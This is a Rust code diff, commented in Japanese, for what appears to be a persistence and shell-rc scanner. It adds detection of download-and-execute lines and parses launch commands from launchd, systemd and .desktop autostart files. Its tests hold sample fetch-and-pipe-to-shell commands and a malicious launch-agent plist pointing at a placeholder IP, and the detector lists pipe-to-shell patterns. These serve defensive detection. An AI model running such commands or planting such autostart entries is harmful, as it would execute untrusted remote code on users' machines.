@@ -227,18 +227,60 @@ pub fn pth_exec_lines(text: &str) -> Vec<String> {
         .collect()
 }
 
+/// ダウンロードしてそのまま実行する形か：`curl … | sh`、`sh -c "$(curl …)"`、`base64 -d | sh` 等。
+/// `bash -c "… --url https://…"` のように URL を引数に渡すだけのものは含めない
+pub fn is_download_exec(line: &str) -> bool {
+    let l = line.to_ascii_lowercase();
+    let f = risky_flags(line);
+    let has = |x: &str| f.iter().any(|v| v == x);
+    let fetch = ["curl ", "wget ", "fetch("].iter().any(|p| l.contains(p));
+    let subst = ["$(curl", "$(wget", "`curl", "`wget", "<(curl", "<(wget"].iter().any(|p| l.contains(p));
+    (fetch && has("pipe_shell")) || subst || (has("base64") && (has("pipe_shell") || has("inline_code")))
+}
+
 /// シェルの rc のうち、ダウンロードしてそのまま実行する行
 pub fn rc_pipe_lines(text: &str) -> Vec<String> {
     text.lines()
         .map(str::trim)
         .filter(|l| !l.starts_with('#'))
-        .filter(|l| {
-            let f = risky_flags(l);
-            (f.iter().any(|x| x == "network") && f.iter().any(|x| x == "pipe_shell" || x == "inline_code"))
-                || f.iter().any(|x| x == "base64") && f.iter().any(|x| x == "pipe_shell" || x == "inline_code")
-        })
+        .filter(|l| is_download_exec(l))
         .map(|l| clip(l, 300))
         .collect()
+}
+
+fn xml_unescape(s: &str) -> String {
+    s.replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&apos;", "'").replace("&amp;", "&")
+}
+
+/// 自動起動のファイルから「何を起動するか」を取り出す。
+/// launchd の plist（XML）は Program・ProgramArguments、systemd は ExecStart=、.desktop は Exec=。
+/// バイナリ形式の plist 等で読めなければ None
+pub fn launch_command(text: &str) -> Option<String> {
+    if let Some(i) = text.find("<key>ProgramArguments</key>") {
+        let rest = &text[i..];
+        let end = rest.find("</array>").unwrap_or(rest.len());
+        let args: Vec<String> = rest[..end]
+            .split("<string>")
+            .skip(1)
+            .filter_map(|x| x.split("</string>").next())
+            .map(xml_unescape)
+            .collect();
+        if !args.is_empty() {
+            return Some(clip(&args.join(" "), 300));
+        }
+    }
+    if let Some(i) = text.find("<key>Program</key>") {
+        let rest = &text[i..];
+        if let Some(v) = rest.split("<string>").nth(1).and_then(|x| x.split("</string>").next()) {
+            return Some(clip(&xml_unescape(v), 300));
+        }
+    }
+    let cmds: Vec<&str> = text
+        .lines()
+        .map(str::trim)
+        .filter_map(|l| l.strip_prefix("ExecStart=").or_else(|| l.strip_prefix("Exec=")))
+        .collect();
+    (!cmds.is_empty()).then(|| clip(&cmds.join(" ; "), 300))
 }
 
 // ---------------------------------------------------------------- 走査
@@ -277,11 +319,26 @@ fn push_items(out: &mut Vec<Item>, kind: &str, p: &Path, data: &[u8], details: V
     }
 }
 
+/// ファイル全体を 1 件として記録する（中身が変わったら changed）。怪しい特徴の付け方は種類ごとに変える：
+/// - workflow：CI の設定には URL や `curl … | sh` が普通に書かれるので付けない（変化だけを知らせる）
+/// - autostart：ファイル全体ではなく「起動するコマンド」だけを見る（plist の DOCTYPE の URL 等で誤検知しないため）
+/// - git_hook：スクリプト全体を見る（フックが外へ通信することはまず無い）
 fn whole_file(out: &mut Vec<Item>, kind: &str, p: &Path) {
     if let Some(data) = read_small(p) {
         let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
-        let risky = risky_flags(&text_of(&data));
-        out.push(Item { kind: kind.into(), path: p.display().to_string(), detail: name, hash: sha(&data), risky });
+        let text = text_of(&data);
+        let (detail, risky) = match kind {
+            "workflow" => (name, vec![]),
+            "autostart" => match launch_command(&text) {
+                Some(cmd) => {
+                    let r = risky_flags(&cmd);
+                    (format!("{name} → {cmd}"), r)
+                }
+                None => (name, vec![]),
+            },
+            _ => (name, risky_flags(&text)),
+        };
+        out.push(Item { kind: kind.into(), path: p.display().to_string(), detail, hash: sha(&data), risky });
     }
 }
 
@@ -527,6 +584,33 @@ mod tests {
         );
         let rc = "export PATH=$PATH:~/bin\ncurl -fsSL https://203.0.113.9/i.sh | bash\n# curl x | sh\necho aGk= | base64 -d | sh\n";
         assert_eq!(rc_pipe_lines(rc).len(), 2);
+    }
+
+    #[test]
+    fn no_false_positive_from_plist_doctype_or_alias() {
+        let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>com.example.updater</string>
+  <key>ProgramArguments</key><array>
+    <string>/Applications/Example.app/Contents/MacOS/updater</string><string>--check</string>
+  </array>
+</dict></plist>"#;
+        let cmd = launch_command(plist).unwrap();
+        assert_eq!(cmd, "/Applications/Example.app/Contents/MacOS/updater --check");
+        assert!(risky_flags(&cmd).is_empty());
+        let bad = plist.replace("--check", "-c").replace(
+            "/Applications/Example.app/Contents/MacOS/updater",
+            "/bin/sh</string><string>-c</string><string>curl -s https://203.0.113.9/a | sh",
+        );
+        assert!(risky_flags(&launch_command(&bad).unwrap()).contains(&"pipe_shell".to_string()));
+        assert_eq!(launch_command("[Service]\nExecStart=/usr/bin/foo --bar\n").unwrap(), "/usr/bin/foo --bar");
+        // URL を引数に渡すだけの alias はダウンロード実行ではない
+        let alias =
+            r#"alias pub='op run -- bash -c "uv publish --publish-url https://test.pypi.org/legacy/ --token $T"'"#;
+        assert!(!is_download_exec(alias));
+        assert!(is_download_exec(r#"sh -c "$(curl -fsSL https://203.0.113.9/install.sh)""#));
+        assert!(is_download_exec("curl -fsSL https://203.0.113.9/i.sh | bash"));
     }
 
     #[test]
